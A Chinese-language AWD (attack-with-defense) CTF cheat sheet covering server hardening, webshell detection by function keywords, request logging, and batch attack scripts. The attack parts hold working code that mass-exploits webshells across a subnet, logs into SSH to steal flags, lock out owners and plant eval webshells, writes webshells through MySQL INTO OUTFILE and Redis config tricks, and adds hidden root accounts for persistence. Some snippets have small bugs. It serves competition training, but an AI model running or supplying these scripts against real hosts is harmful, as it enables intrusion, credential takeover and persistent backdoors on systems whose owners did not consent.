# AWD使用



## 系统

首先修改账号密码

## Web：

#### 有网环境：

1. 查看网站目录有无木马，如果使用自己的机器可以拖到D盾里扫描

   ```shell
   tar -xf www.tar.gz #解压文件
   #注意 tar是不会把隐藏文件打包的，需要自己查找
   #隐藏文件查找指令 ls -a
   ```

2. 有网环境下搜索网上有关OA漏洞，使用通用POC 看能不能攻击成功，如果攻击成功 根据Payload加固本地环境 

   ```php
   #举例： 命令执行，收到命令后直接exit();
   <?php 
       if($_GET['a']){
           exit();
       }
   ?>
   ```



#### 没网环境

1. 使用正则找马

   ```shell
   grep -RlE "system|passthru|exec" ./
   ```

   根据具体环境 写具体的表达式，同时也可以写针对各个漏洞的过滤 例如：文件上传 SQL注入 ，寻找有特征的语句





#### 无论是有网还是没网环境都该做的事

1. 备份数据库文件 网站文件 ，不要备份到web目录

   ```shell
   mysqldump -uroot -proot > www.sql
   tar -cvf  www.tar.gz  /var/www/html #打包文件
   ```

2. 杀掉木马后，修改配置文件（一般都是mysql的配置文件 里面会有数据库的密码）

   因为有的靶机是不会给数据库的密码的，需要去配置文件里查找，一般的配置文件 

   config.php mysql.php connect.php，可以用正则去查找关键字 

   **关键字**：localhost ，username，password，127.0.0.1

3. 进入数据库 修改默认账号密码（同步配置文件修改），比如mysql的root用户密码修改成**chin0625**

   那么网站连接数据的配置文件的密码也要同步修改成chin0625，不然Web会报错，扣**环境分**

4. 如果有时间 可以上waf 

   上waf具体得看环境，对.htaccess有没有限制什么的

   如果没有限制那就

   ```php+HTML
   php_value auto_prepend_file /tmp/waf.php
   ```

   如果有限制 那就用sed给每个文件第一行批量添加waf过滤

   ```shell
   sed -ri "1 i\<?php require_once('/var/www/html/waf.php');?>" `grep -rlE "system|eval|exec|extra" |grep php`  #每个文件前插入
    sed -i "1d " `grep -rlE "system|eval|exec|extra" |grep php`  #删除每个文件的第一行，相当于上一行的撤销
   ```

   如果该操作导致文件报错  可以把include写在数据库连接/配置文件里面（写到config.php中）

   ```php
   <?php require_once('/var/www/html/waf.php');?>
   ```

5. 加固完成之后  如果有时间验证waf是否生效

6. 如果还有时间 可以写一个日志 这样可以查看别人是怎么拿的你的flag ，同时使用该日志也可以骑马

   ```php
   <?php 
   function a()
   {
   	$raw='';
   	$raw.=$_SERVER['REQUEST_METHOD'] . ' ' . $_SERVER['REQUEST_URI'] .  ' ' . $_SERVER['SERVER_PROTOCOL'] . "\r\n" ;
   	foreach($_SERVER as $key => $value)
   	{
   		if(substr($key,0,5)==='HTTP_')
   		{
   			$key=substr($key,5);
   			$raw.=$key . ' : ' . $value . "\r\n";
   		}
   	}
   	$raw.="\r\n";
   	$raw.=file_get_contents('php://input');
   	return $raw;
   }
   function b()
   {
   	$data=date("Y/m/d H:i:s") . "\r\n" . a() . "\r\n\r\n";
   	$f=fopen("/tmp/logs.txt","a");
   	fwrite($f,$data);
   	fclose($f);
   }
   b();
   ?>
   ```

7. 写过滤时可以参考的参数

8. ```php
   php后门木马常用的函数大致上可分为四种类型：
   1. 执行系统命令: system, passthru, shell_exec, exec, popen, proc_open
   2. 代码执行与加密: eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13
   3. 文件包含与生成: require, require_once, include, include_once, file_get_contents, file_put_contents, fputs, fwrite
   4. .htaccess: SetHandler, auto_prepend_file, auto_append_file
   ```

9. 切记要修改默认用户密码

10. 加固完成后，记住修复的漏洞点，写py拿洞

    ```python
    import requests
    for i in range(1,254):
        try:
            url = f"http://172.167.{i}.2/shell.php?cmd=system('cat /flag');"
            r = requests.get(url,timeout=0.5)
            if r.status_code == 200:
                print(r.text)
        except:
            pass
    ```

    



##### 攻击：

1. 记住漏洞点写脚本批量拿

2. 记住一些默认用户的密码 或者弱密码 比如web的后台密码 mysql的密码，mysql如果不修改密码 可以读写文件

   ```php
   select load_file('/flag.txt'); #读文件
   select "<?php eval($_GET['a']);?>" into outfile "/var/www/html/.file.php" #写文件
       
   #该操作需要secure_file_prive支持
   ```

3. 拿ssh账密 

   ```python
   import paramiko
   import threading
   def con(host,user,passwd):
      npass='xxcc123##'
      try:      
            s=paramiko.SSHClient()
            s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            s.connect(hostname=host,username=user,password=passwd,port=22)
            a,b,c=s.exec_command("cat /flag")
            print("%s===flag{%s}"%s(host,str(b.read()))
            d,e,f=s.exec_command("passwd")
            d.write(passwd+'\n'+npass+'\n'+npass+'\n')
            x,y,z=s.exec_command("echo '<?php @eval($_POST[x]);?>' >/var/www/html/zzc.php")
            s.close()
      except:
            pass
   
   user='ctf'
   passwd='654321#'
   for i  in range(1,36):
               ip='{}'.format
               t=threading.Thread(target=con,args=(ip,user,passwd))
               t.start()
   ```

4. root用户快速修改账密

   ```shell
   useradd test
   echo test:chin0625|chpasswd
   ```

   

#### 思路总结

> ​	AWD开始时，拼的是手速，如果用的是赛方给的电脑 可以在上一个阶段最后时间（真的全部尝试过 尽力了）写ssh脚本，ssh脚本往往是最有用的，其次是web shell
>
> ​	在本人没有丢分/少量丢分的同时 又拿到了不少ssh账密码，可以团队合作 一个人负责加固机器,一个人拿flag的同时帮忙加固对手的机器
>
> 加固方法：
>
> 1. 之前用php写的日志，查看日志，是否有攻击成功的日志， 同时也可以分析一下日志里面有没有能骑的马
>
> 2. 如果日志流量正常，使用w 查看当前用户，验证是否同时间有多个用户连上主机（有的话就是ssh账号没删干净/没改密码）
>
> 3. 使用netstat -anpt 查看本地对外连接 ，有没有异常进程（本地端口连到另外有一台PC的端口） 杀进程
>
> 
>
> 拿flag以及加固对手的机器：
>
> 1. 什么都没有交flag重要，先交flag 后加固
>
> 2. 对手的机器别人肯定也攻击进去了，这个时候如果是root用户 可以杀进程+删用户，如果做的极端一点，可以是service iptables start
>
> 3. 在对手的机器上查看对外连接，把对本机的连接以外的所有连接都杀掉
>
> 4. 最好在对手机器上新增一个root权限的 只有你自己知道的用户



# SSH

修改配置文件  **sshd_config**

```
PermitRootLogin no
AllowUsers User1 User2
```

## Mysql

```mysql
updates mysql.user set password=password("密码") where user="root";       #修改账号密码 
flush privileges; #修改完刷新缓存 
```

攻击脚本

```shell
user=root
pass=root
for i in `cat host.txt`
do
echo ip=$i
date
cmd=`mysql -h$i -u$user -p$pass 2>/dev/null << EOF
select load_file('C:\flag.txt');
select user,password from mysql.user;
exit
EOF`
echo $cmd
done

```



## Redis

```shell
修改账号密码 防止未授权
config set requirepass 密码
```

攻击脚本

```shell
pass=123456
for i in `cat host.txt`
do
`redis-cli -h $i -p6379 -a $pass 2/dev/null <<EOF
config set requirepass aaaaaa
config set dir /var/www/html
config set dbfilename a.php
set 1 "<?php fwrite(fopen('x.php','w'),base64_decode('PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4K'));?>"
save
quit
EOF`
done
```